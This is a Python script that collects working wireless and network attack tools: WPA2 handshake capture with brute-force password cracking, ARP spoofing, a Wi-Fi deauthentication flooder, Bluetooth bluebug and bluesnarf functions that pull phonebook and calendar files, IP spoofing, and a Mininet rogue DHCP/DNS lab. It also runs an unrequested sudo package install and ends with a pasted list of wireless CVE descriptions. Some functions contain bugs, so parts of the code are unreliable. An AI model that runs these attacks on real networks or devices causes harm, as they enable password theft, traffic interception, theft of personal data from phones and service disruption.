import colorama
from scapy.all import *
import pandas
import time
import os
import signal
import itertools
import socket
import hashlib
import hmac
import sys
import shutil
from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.nodelib import LinuxBridge
from nat import connectToInternet, stopNAT
import bluetooth as bt
from scapy.all import send, IP, ICMP
from os.path import basename
from PyOBEX import client, headers, responses
from scapy.all import Ether, ARP, srp, send
import argparse
import socket
import struct
import binascii
from scapy.all import *
from colorama import Fore

def wpa2_krack():
    BEACON_FRAME = b'\x80\x00'
    ASSOCIATION_RESP_FRAME = b'\x10\x00'
    HANDSHAKE_AP_FRAME = b'\x88\x02' 
    HANDSHAKE_STA_FRAME = b'\x88\x01' 

    WIFI_INTERFACE = 'wlp2s0' 
    SSID = 'TEST_SSID' 
    PASSWORD_LIST = itertools.product('0123456789ABCDEF', repeat=8) 

    os.system('ifconfig {0} promisc && ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'
            .format(WIFI_INTERFACE))
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

    association_init = False
    handshake_counter = 0
    ap_mac = None
    sta_mac = None
    ap_nonce = None
    sta_nonce = None

    def crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic):

        def sort(in_1, in_2):
            if len(in_1) != len(in_2):
                raise 'lengths do not match!'
            in_1_byte_list = list(bytes(in_1))
            in_2_byte_list = list(bytes(in_2))

            for i in range(0, len(in_1_byte_list)):
                if in_1_byte_list[i] < in_2_byte_list[i]:
                    return (in_2, in_1) 
                elif in_1_byte_list[i] > in_2_byte_list[i]:
                    return (in_1, in_2) 
            return (in_1, in_2) 

        max_mac, min_mac = sort(ap_mac, sta_mac)
        max_nonce, min_nonce = sort(ap_nonce, sta_nonce)

        message = b''.join([
            b'Pairwise key expansion\x00',
            min_mac,
            max_mac,
            min_nonce,
            max_nonce,
            b'\x00'
        ])

        for password_guess in PASSWORD_LIST: 
            password_guess = ''.join(password_guess).encode()

            pmk = hashlib.pbkdf2_hmac('sha1', password_guess, SSID.encode(), 4096, 32)
            kck = hmac.new(pmk, message, hashlib.sha1).digest()[:16]
            calculated_mic = hmac.new(kck, eapol_frame_zeroed_mic, hashlib.sha1).digest()[:16]

            if calculated_mic == mic:
                print('The password is: {}'.format(password_guess.decode('ASCII')))
                sys.exit(0)

        print('The password was not found')
        sys.exit(1)

    while True:
        packet = sock.recvfrom(2048)[0]

        if packet[0:2] == b'\x00\x00': 
            radiotap_header_length = int(packet[2])
            packet = packet[radiotap_header_length:] 

            if packet != b'\x00\x00\x00\x00': 
                frame_ctl = packet[0:2]
                duration = packet[2:4]
                address_1 = packet[4:10]
                address_2 = packet[10:16]
                address_3 = packet[16:22]
                sequence_control = packet[22:24]
                address_4 = packet[24:30]
                payload = packet[30:-4]
                crc = packet[-4:]

                if ap_mac is None and frame_ctl == BEACON_FRAME and SSID in str(payload):
                    ap_mac = address_2
                    print('Found MAC address of access point for {}: {}'.format(SSID, ap_mac.hex()))
                    print('Waiting for a device to associate with the network...')

                
                elif ap_mac is not None and (address_1 == ap_mac or address_2 == ap_mac):
                    if frame_ctl == ASSOCIATION_RESP_FRAME: 
                        association_init = True
                        sta_mac = address_1
                        print('Association initiated')
                        print('Waiting for 4-way handshake...')

                    elif association_init: 
                        if frame_ctl == HANDSHAKE_AP_FRAME or frame_ctl == HANDSHAKE_STA_FRAME:
                            handshake_counter += 1
                            print('Received handshake {} of 4'.format(handshake_counter))

                            eapol_frame = payload[4:] 

                            version = eapol_frame[0]
                            eapol_frame_type = eapol_frame[1]
                            body_length = eapol_frame[2:4]
                            key_type = eapol_frame[4]
                            key_info = eapol_frame[5:7]
                            key_length = eapol_frame[7:9]
                            replay_counter = eapol_frame[9:17]
                            nonce = eapol_frame[17:49]
                            key_iv = eapol_frame[49:65]
                            key_rsc = eapol_frame[65:73]
                            key_id = eapol_frame[73:81]
                            mic = eapol_frame[81:97]
                            wpa_key_length = eapol_frame[97:99]
                            wpa_key = eapol_frame[99:]

                            if handshake_counter == 1 and frame_ctl == HANDSHAKE_AP_FRAME:
                                ap_nonce = nonce
                            elif handshake_counter == 2 and frame_ctl == HANDSHAKE_STA_FRAME:
                                sta_nonce = nonce
                            elif handshake_counter == 3 and frame_ctl == HANDSHAKE_AP_FRAME:
                                continue
                            elif handshake_counter == 4 and frame_ctl == HANDSHAKE_STA_FRAME:
                                eapol_frame_zeroed_mic = b''.join([
                                    eapol_frame[:81],
                                    b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
                                    eapol_frame[97:99]
                                ])

                                print('Attempting to find password...')
                                crack_wpa(ap_mac, sta_mac, ap_nonce, sta_nonce, eapol_frame_zeroed_mic, mic)
                            else: 
                                association_init = False
                                handshake_counter = 0
                                ap_mac = None
                                sta_mac = None
                                ap_nonce = None
                                sta_nonce = None

def monitor():
    network = pandas.DataFrame(columns=["BSSID","SSID","dBm_Signal","Channel","Crypto"])
    network.set_index("BSSID",inplace=True)

    def callback(packet):
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode()
        try:
                dbm_signal = packet.dBm_AntSignal  
        except:
            dbm_signal = "N/A"
        stats = packet[Dot11Beacon]
        channel = stats.get("channel")
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
    def print_all():
        while True:
            os.system("clear")
            print (network)
            time.sleep(0.5)
    if __name__ == "__main__":
        interface = input("type your name interface :>")
        printer = Thread(target=print_all)
        printer.daemon = True
        printer.start()()
        sniff(prn=callback,iface=interface)
    def change_channel():
        ch = 1
        while True:
            os.system(f"iwconfig{interface} channel {ch}")
            ch = ch % 14 + 1
            time.sleep(0.5)


def dhcp_spoof():
    #dhcp spoofing
    # Is network manager running?
    def isNetworkManagerRunning():
        return os.system("pgrep NetworkManager &>/dev/null") == 0

    class DHCPTopo(Topo):
        def __init__(self, *args, **kwargs):
            Topo.__init__(self, *args, **kwargs)

            os.system('mount --bind /etc /etc')
            os.system('mount --make-rprivate /etc')
            os.system('mount --bind /var /var')
            os.system('mount --make-rprivate /var')

            self.client_etc = '/tmp/etc-client'
            self.client_var = '/tmp/var-client'
            self.createDirs([self.client_etc, self.client_var])
            private = [('/etc', self.client_etc), ('/var', self.client_var)]

            client = self.addHost('h1',
                    ip='10.0.0.10/24',
                    privateDirs=private,
                    inNamespace=True)

            switch1 = self.addSwitch('s1')
            switch2 = self.addSwitch('s2')
            dhcp = self.addHost('dhcp', ip='10.0.0.50/24')
            evil = self.addHost('evil', ip='10.0.0.66/24')
            self.addLink(client, switch1)
            self.addLink(evil, switch1)
            self.addLink(dhcp, switch2)
            self.addLink(switch1, switch2)

        def __enter__(self):
            return self

        def __exit__(self, type, value, traceback):
            shutil.rmtree(self.client_etc)
            shutil.rmtree(self.client_var)

            os.system('umount /etc &>/dev/null')
            os.system('umount /var &>/dev/null')

        def createDirs(self, dirs):
            for d in dirs:
                try:
                    os.makedirs(d)
                except OSError:
                    pass

    DHCPTemplate = """
    start		10.0.0.10
    end		10.0.0.90
    option	subnet	255.255.255.0
    option	domain	local
    option	lease	7  # seconds
    """

    def outputNet(l):
        for h in l:
            print("Host:", h.name, "IP:", h.IP(), "MAC:", h.MAC())

    def setupPrivateFS(host, etc, var):
        host.cmd('touch ', etc + '/resolv.conf')
        host.cmd('mkdir -p', var + '/lib/misc')
        host.cmd('mkdir -p', var + '/lib/dhclient')
        host.cmd('mkdir -p', var + '/run')
        host.cmd('touch ', var + '/lib/misc/udhcpd.leases')
        host.cmd('touch ', var + '/lib/dhclient/dhclient.leases')

    def waitForIP(host):
        info('*', host, 'waiting for IP address')
        while True:
            host.defaultIntf().updateIP()
            if host.IP():
                break
            info('.')
            time.sleep(1)
        info('\n')
        info('*', host, 'is now at',host.IP(),'and is using',
            host.cmd('grep nameserver /etc/resolv.conf'))
        info('\n')

    def startDHCPclient(host):
        intf = host.defaultIntf()
        host.cmd('touch /tmp/dhclient.conf', intf)
        host.cmd('dhclient -v -d -r', intf)
        host.cmd('dhclient -v -d -cf /tmp/dhclient.conf ' \
                '1> /tmp/dhclient.log 2>&1', intf, '&')

    def stopDHCPclient(host):
        host.cmd('kill %dhclient')
        host.cmd('rm /tmp/dhclient.log')
        host.cmd('rm /tmp/dhclient.conf')

    # Good DHCP Server
    def makeDHCPconfig(filename, intf, gw, dns):
        config = (
            'interface %s' % intf,
            DHCPTemplate,
            'option router %s' % gw,
            'option dns %s' % dns,
            '')
        with open(filename, 'w') as f:
            f.write('\n'.join(config))

    def cleanDHCPconfig(host, filename):
        host.cmd('rm ', filename)

    def startGoodDHCPserver(host, gw, dns):
        info('* Starting good DHCP server on', host, 'at', host.IP(), '\n')
        dhcpConfig = '/tmp/%s-udhcpd.conf' % host
        makeDHCPconfig(dhcpConfig, host.defaultIntf(), gw, dns)
        host.cmd('busybox udhcpd -f', dhcpConfig,
                '1>/tmp/%s-dhcp.log 2>&1  &' % host)

    def stopGoodDHCPserver(host):
        info('* Stopping good DHCP server on', host, 'at', host.IP(), '\n')
        host.cmd('kill %udhcpd')
        dhcpConfig = '/tmp/%s-udhcpd.conf' % host
        cleanDHCPconfig(host, dhcpConfig)

    # Bad DHCP Server
    def startBadDHCPserver(host, gw, dns):
        info('* Starting bad DHCP server on', host, 'at', host.IP(), '\n')
        host.cmd('ettercap -T -M dhcp:10.0.0.10-90/255.255.255.0/%s ' \
                '-a etter.conf &>/tmp/ettercap.log &' % host.IP())

    def stopBadDHCPserver(host):
        info('* Stopping bad DHCP server on', host, 'at', host.IP(), '\n')
        host.cmd('kill %ettercap')
        host.cmd('rm /tmp/ettercap.log')


    def startGoodDNSserver(host):
        info('* Starting good DNS server', host, 'at', host.IP(), '\n')
        host.cmd('dnsmasq -k -x /tmp/dnsmasq.pid -C - ' \
                '1>/tmp/dns-good.log 2>&1 </dev/null &')

    def stopGoodDNSserver(host):
        info('* Stopping good DNS server', host, 'at', host.IP(), '\n')
        host.cmd('kill $(cat /tmp/dnsmasq.pid)')
        host.cmd('rm /tmp/dns-good.log')
        host.cmd('rm /tmp/dnsmasq.pid')

    def startBadDNSserver(host):
        info('* Starting bad DNS server', host, 'at', host.IP(), '\n')
        host.cmd('python2 dnschef.py --file=dnschef.ini -i ' \
                '10.0.0.66 1>/tmp/dns-bad.log 2>&1 &')

    def stopBadDNSserver(host):
        info('* Stopping bad DNS server', host, 'at', host.IP(), '\n')
        host.cmd('kill %dnschef')
        host.cmd('rm /tmp/dns-bad.log')


    def startSwitchBlocking(host, realMAC):
        info('* Starting DHCP blocking on', host, 'at', host.IP(),
                'all but from', realMAC, '\n')
        host.cmd('ebtables -I FORWARD -s \! %s --protocol ipv4 --ip-proto udp ' \
                '--ip-dport 68 -j DROP' % realMAC)

    def stopSwitchBlocking(host):
        host.cmd('ebtables -F')

    def startSwitchCounterattack(host, realMAC):
        pass

    def stopSwitchCounterattack(host):
        pass


    def clientBlockingConfig(host, realMAC):
        config = (
            'interface "%s" {' % host.defaultIntf(),
            'anycast-mac ethernet %s;' % realMAC,
            '}',
            '')
        with open('/tmp/dhclient.conf', 'w') as f:
            f.write('\n'.join(config))

    def setupStaticIP(host, ip, mask, gw, dns):
    
        host.cmd('ip addr add %s/%s dev %s' % (ip, mask, host.defaultIntf()))
        host.cmd('ip route add default via %s metric 100 dev %s' % \
                (gw, host.defaultIntf()))


        host.cmd('echo "nameserver %s" > /etc/resolv.conf' % dns)

    def usage():
        print ("""Usage: python2 dhcp_spoof.py interface [preventionTechnique]
    Interface
        the interface on which to get Internet access, e.g. eth0
    Prevention Technique:
        0 - none, allow the attack to happen (default)
        1 - ebtables blocking all but correct DHCP packets
        2 - dhclient anycast-mac
        3 - static IP
    Not yet implemented:
        4 - counter attack, DHCP starve the attacker
        5 - ebtables block IP spoofing by looking at MAC
        6 - use snort (IPS) on switch to detect attacker
    """)

    if __name__ == '__main__':
        setLogLevel('info')

        # Parse arguments
        if len(sys.argv) == 2:
            inetIntf = sys.argv[1]
            prevent = 0
        elif len(sys.argv) == 3:
            inetIntf = sys.argv[1]
            prevent = int(sys.argv[2])

            if prevent < 0 or prevent > 6:
                print ("Error: invalid technique number")
                sys.exit(1)
            elif prevent > 3:
                print ("Error: technique not yet implemented")
                sys.exit(1)
        else:
            usage()
            sys.exit(1)

        with DHCPTopo() as topo:
            net = Mininet(topo=topo, link=TCLink, switch=LinuxBridge,
                    controller=None, autoSetMacs=True)
            h1, dhcp, evil, switch = net.get('h1', 'dhcp', 'evil', 's1')
            setupPrivateFS(h1, topo.client_etc, topo.client_var)
            rootnode = connectToInternet(net, inetIntf, 's1')

            try:
                raw_input("Press return after you've started wireshark on s1")

                if prevent == 2:
                    clientBlockingConfig(h1, dhcp.MAC())

                startGoodDHCPserver(dhcp, gw=rootnode.IP(), dns=dhcp.IP())
                startGoodDNSserver(dhcp)

                if prevent == 1:
                    startSwitchBlocking(switch, dhcp.MAC())
                elif prevent == 4:
                    startSwitchCouterattack(switch, dhcp.MAC())

                startBadDHCPserver(evil, gw=rootnode.IP(), dns=evil.IP())
                startBadDNSserver(evil)
                h1.cmd('ifconfig', h1.defaultIntf(), '0')

                if prevent == 3:
                    setupStaticIP(h1, h1.IP(), 8, rootnode.IP(), dhcp.IP())
                else:
                    time.sleep(4)

                    startDHCPclient(h1)
                    waitForIP(h1)

                print ("Pinging google.com")
                h1.cmdPrint('ping -c 1 -w 1 google.com')

                outputNet([h1, dhcp, evil])
                print

                print ("Dropping to CLI, exit to cleanup virtual network.")
                CLI(net)

            except KeyboardInterrupt:
                print
                print ("Exiting...")

            finally:
                if prevent == 1:
                    stopSwitchBlocking(switch)
                elif prevent == 4:
                    stopSwitchCounterattack(switch)

                stopBadDNSserver(evil)
                stopBadDHCPserver(evil)
                stopGoodDNSserver(dhcp)
                stopGoodDHCPserver(dhcp)
                stopDHCPclient(h1)
                stopNAT(rootnode)
                net.stop()

def blue_bug():
    if len(sys.argv) < 2:
        print(sys.argv[0] + " <btaddr> <channel>")
        sys.exit(0)

    btaddr = sys.argv[1]
    channel = int(sys.argv[2]) or 17
    running = True

    sock = bt.BluetoothSocket(bt.RFCOMM)
    sock.connect((sys.argv[1], channel))

    while running:
        cmd = input(">>> ")

        if cmd == "quit" or cmd == "exit":
            running = False
        else:
            sock.send(cmd)

    sock.close()

def dns_spoof():
    os.system("sudo python3 dns_spoof.py")

def ip_spoof():

    if len(sys.argv) < 3:
        print(sys.argv[0] + " <src_ip> <dst_ip>")
        sys.exit(1)

    packet = IP(src=sys.argv[1], dst=sys.argv[2]) / ICMP()
    answer = send(packet)

    if answer:
        answer.show()



def wlan_sniff():

    iface = input("type your enterface :>")
    iwconfig_cmd = "/usr/sbin/iwconfig"

    os.system(iwconfig_cmd + " " + iface + " mode monitor")
    os.system("sudo airmon-ng start "+iface)
    def dump_packet(pkt):
        if not pkt.haslayer(Dot11Beacon) and \
        not pkt.haslayer(Dot11ProbeReq) and \
        not pkt.haslayer(Dot11ProbeResp):
            print(pkt.summary())

            if pkt.haslayer(Raw):
                print(hexdump(pkt.load))
            print("\n")


    while True:
        for channel in range(1, 14):
            os.system(iwconfig_cmd + " " + iface + \
                    " channel " + str(channel))
            print("Sniffing on channel " + str(channel))

            sniff(iface=iface,
                prn=dump_packet,
                count=10,
                timeout=3,
                store=0)

def bluesnarf():
    def get_file(client, filename):
        """
        Use OBEX get to retrieve a file and write it
        to a local file of the same name
        """
        r = client.get(filename)

        if isinstance(r, responses.FailureResponse):
            print("Failed to get file " + filename)
        else:
            headers, data = r

            fh = open(filename, "w+")
            fh.write(data)
            fh.close()
        

    if len(sys.argv) < 3:
        print(sys.argv[0] + ": <btaddr> <channel>")
        sys.exit(0)

    btaddr = sys.argv[1]
    channel = int(sys.argv[2])

    print("Bluesnarfing %s on channel %d" % (btaddr, channel))

    c = client.BrowserClient(btaddr, channel)
        
    try:
        r = c.connect()
    except OSError as e:
        print("Connect failed. " + str(e))

    if isinstance(r, responses.ConnectSuccess):
        c.setpath("telecom")
        
        get_file(c, "cal.vcs")
        get_file(c, "pb.vcf")

        c.disconnect()

def arp_spoof():
    import scapy.all as scapy
    import time

    def get_mac(ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc

    def spoof(target_ip, spoof_ip):
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
                                                                psrc = spoof_ip)
        scapy.send(packet, verbose = False)


    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)
        

    target_ip = input("Enter your target IP")
    gateway_ip = input(" Enter your gateway's IP")

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2) # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

def wifi_death():
    os.system("sudo airmon-ng start wlan0")
    target_mac = input("type your target mac address :>")
    gateway_mac = input("type your target gateway mac address :>")
    inter = input("type your iface :>")
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100, iface=inter, verbose=1)
    
os.system("sudo apt-get install -y neofetch ")
os.system("clear")
os.system("neofetch")





def cve():
    print (colorama.Fore.BLUE,"""
    CVE-2021-41753 	A denial-of-service attack in WPA2, and WPA3-SAE authentication methods in D-Link DIR-X1560, v1.04B04, and DIR-X6060, v1.11B04 allows a remote unauthenticated attacker to disconnect a wireless client via sending specific spoofed SAE authentication frames.

    CVE-2021-39510 	An issue was discovered in D-Link DIR816_A1_FW101CNB04 750m11ac wireless router, The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.

    CVE-2021-38703 	Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.

    CVE-2021-37964 	Inappropriate implementation in ChromeOS Networking in Google Chrome on ChromeOS prior to 94.0.4606.54 allowed an attacker with a rogue wireless access point to to potentially carryout a wifi impersonation attack via a crafted ONC file.

    CVE-2021-37911 	The management interface of BenQ smart wireless conference projector does not properly control user's privilege. Attackers can access any system directory of this device through the interface and execute arbitrary commands if he enters the local subnetwork.

    CVE-2021-34770 	A vulnerability in the Control and Provisioning of Wireless Access Points (CAPWAP) protocol processing of Cisco IOS XE Software for Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, remote attacker to execute arbitrary code with administrative privileges or cause a denial of service (DoS) condition on an affected device. The vulnerability is due to a logic error that occurs during the validation of CAPWAP packets. An attacker could exploit this vulnerability by sending a crafted CAPWAP packet to an affected device. A successful exploit could allow the attacker to execute arbitrary code with administrative privileges or cause the affected device to crash and reload, resulting in a DoS condition.

    CVE-2021-34769 	Multiple vulnerabilities in the Control and Provisioning of Wireless Access Points (CAPWAP) protocol processing of Cisco IOS XE Software for Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. These vulnerabilities are due to insufficient validation of CAPWAP packets. An attacker could exploit the vulnerabilities by sending a malformed CAPWAP packet to an affected device. A successful exploit could allow the attacker to cause the affected device to crash and reload, resulting in a DoS condition.

    CVE-2021-34768 	Multiple vulnerabilities in the Control and Provisioning of Wireless Access Points (CAPWAP) protocol processing of Cisco IOS XE Software for Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. These vulnerabilities are due to insufficient validation of CAPWAP packets. An attacker could exploit the vulnerabilities by sending a malformed CAPWAP packet to an affected device. A successful exploit could allow the attacker to cause the affected device to crash and reload, resulting in a DoS condition.

    CVE-2021-34767 	A vulnerability in IPv6 traffic processing of Cisco IOS XE Wireless Controller Software for Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, adjacent attacker to cause a Layer 2 (L2) loop in a configured VLAN, resulting in a denial of service (DoS) condition for that VLAN. The vulnerability is due to a logic error when processing specific link-local IPv6 traffic. An attacker could exploit this vulnerability by sending a crafted IPv6 packet that would flow inbound through the wired interface of an affected device. A successful exploit could allow the attacker to cause traffic drops in the affected VLAN, thus triggering the DoS condition.

    CVE-2021-34740 	A vulnerability in the WLAN Control Protocol (WCP) implementation for Cisco Aironet Access Point (AP) software could allow an unauthenticated, adjacent attacker to cause a reload of an affected device, resulting in a denial of service (DoS) condition. This vulnerability is due to incorrect error handling when an affected device receives an unexpected 802.11 frame. An attacker could exploit this vulnerability by sending certain 802.11 frames over the wireless network to an interface on an affected AP. A successful exploit could allow the attacker to cause a packet buffer leak. This could eventually result in buffer allocation failures, which would trigger a reload of the affected device.

    CVE-2021-34573 	In Enbra EWM in Version 1.7.29 together with several tested wireless M-Bus Sensors the events backflow and "no flow" are not reconized or misinterpreted. This may lead to wrong values and missing events.

    CVE-2021-34572 	Enbra EWM 1.7.29 does not check for or detect replay attacks sent by wireless M-Bus Security mode 5 devices. Instead timestamps of the sensor are replaced by the time of the readout even if the data is a replay of earlier data.

    CVE-2021-34571 	Multiple Wireless M-Bus devices by Enbra use Hard-coded Credentials in Security mode 5 without an option to change the encryption key. An adversary can learn all information that is available in Enbra EWM.

    CVE-2021-34174 	A vulnerability exists in Broadcom BCM4352 and BCM43684 chips. Any wireless router using BCM4352 and BCM43684 will be affected, such as ASUS AX6100. An attacker may cause a Denial of Service (DoS) to any device connected to BCM4352 or BCM43684 routers via an association or reassociation frame.


    CVE-2021-33478 	The TrustZone implementation in certain Broadcom MediaxChange firmware could allow an unauthenticated, physically proximate attacker to achieve arbitrary code execution in the TrustZone Trusted Execution Environment (TEE) of an affected device. This, for example, affects certain Cisco IP Phone and Wireless IP Phone products before 2021-07-07. Exploitation is possible only when the attacker can disassemble the device in order to control the voltage/current for chip pins.

    CVE-2021-3275 	Unauthenticated stored cross-site scripting (XSS) exists in multiple TP-Link products including WIFI Routers (Wireless AC routers), Access Points, ADSL + DSL Gateways and Routers, which affects TD-W9977v1, TL-WA801NDv5, TL-WA801Nv6, TL-WA802Nv5, and Archer C3150v2 devices through the improper validation of the hostname. Some of the pages including dhcp.htm, networkMap.htm, dhcpClient.htm, qsEdit.htm, and qsReview.htm and use this vulnerable hostname function (setDefaultHostname()) without sanitization.

    CVE-2021-30165 	The default administrator account & password of the EDIMAX wireless network camera is hard-coded. Remote attackers can disassemble firmware to obtain the privileged permission and further control the devices.

    CVE-2021-29280 	In TP-Link Wireless N Router WR840N an ARP poisoning attack can cause buffer overflow

    CVE-2021-28937 	The /password.html page of the Web management interface of the Acexy Wireless-N WiFi Repeater REV 1.0 (28.08.06.1) contains the administrator account password in plaintext. The page can be intercepted on HTTP.

    CVE-2021-28936 	The Acexy Wireless-N WiFi Repeater REV 1.0 (28.08.06.1) Web management administrator password can be changed by sending a specially crafted HTTP GET request. The administrator username has to be known (default:admin) whereas no previous authentication is required.

    CVE-2021-28160 	Wireless-N WiFi Repeater REV 1.0 (28.08.06.1) suffers from a reflected XSS vulnerability due to unsanitized SSID value when the latter is displayed in the /repeater.html page ("Repeater Wizard" homepage section).

    CVE-2021-27954 	A heap-based buffer overflow vulnerability exists on the ecobee3 lite 4.5.81.200 device in the HKProcessConfig function of the HomeKit Wireless Access Control setup process. A threat actor can exploit this vulnerability to force the device to connect to a SSID or cause a denial of service.

    CVE-2021-27953 	A NULL pointer dereference vulnerability exists on the ecobee3 lite 4.5.81.200 device in the HomeKit Wireless Access Control setup process. A threat actor can exploit this vulnerability to cause a denial of service, forcing the device to reboot via a crafted HTTP request.

    CVE-2021-25435 	Improper input validation vulnerability in Tizen bootloader prior to Firmware update JUL-2021 Release allows arbitrary code execution using recovery partition in wireless firmware download mode.

    CVE-2021-25434 	Improper input validation vulnerability in Tizen bootloader prior to Firmware update JUL-2021 Release allows arbitrary code execution using param partition in wireless firmware download mode.

    CVE-2021-2362 	Vulnerability in the Oracle Field Service product of Oracle E-Business Suite (component: Wireless). Supported versions that are affected are 12.1.1-12.1.3. Easily exploitable vulnerability allows low privileged attacker with network access via HTTP to compromise Oracle Field Service. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Field Service accessible data as well as unauthorized access to critical data or complete access to all Oracle Field Service accessible data. CVSS 3.1 Base Score 8.1 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).

    CVE-2021-20635 	Improper restriction of excessive authentication attempts in LOGITEC LAN-WH450N/GR allows an attacker in the wireless range of the device to recover PIN and access the network.

    CVE-2021-1615 	A vulnerability in the packet processing functionality of Cisco Embedded Wireless Controller (EWC) Software for Catalyst Access Points (APs) could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected AP. This vulnerability is due to insufficient buffer allocation. An attacker could exploit this vulnerability by sending crafted traffic to an affected device. A successful exploit could allow the attacker to exhaust available resources and cause a DoS condition on an affected AP, as well as a DoS condition for client traffic traversing the AP.

    CVE-2021-1611 	A vulnerability in Ethernet over GRE (EoGRE) packet processing of Cisco IOS XE Wireless Controller Software for the Cisco Catalyst 9800 Family Wireless Controller, Embedded Wireless Controller, and Embedded Wireless on Catalyst 9000 Series Switches could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability is due to improper processing of malformed EoGRE packets. An attacker could exploit this vulnerability by sending malicious packets to the affected device. A successful exploit could allow the attacker to cause the device to reload, resulting in a DoS condition.

    CVE-2021-1565 	Multiple vulnerabilities in the Control and Provisioning of Wireless Access Points (CAPWAP) protocol processing of Cisco IOS XE Software for Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. These vulnerabilities are due to insufficient validation of CAPWAP packets. An attacker could exploit the vulnerabilities by sending a malformed CAPWAP packet to an affected device. A successful exploit could allow the attacker to cause the affected device to crash and reload, resulting in a DoS condition.

    CVE-2021-1555 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1554 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1553 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1552 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1551 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1550 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

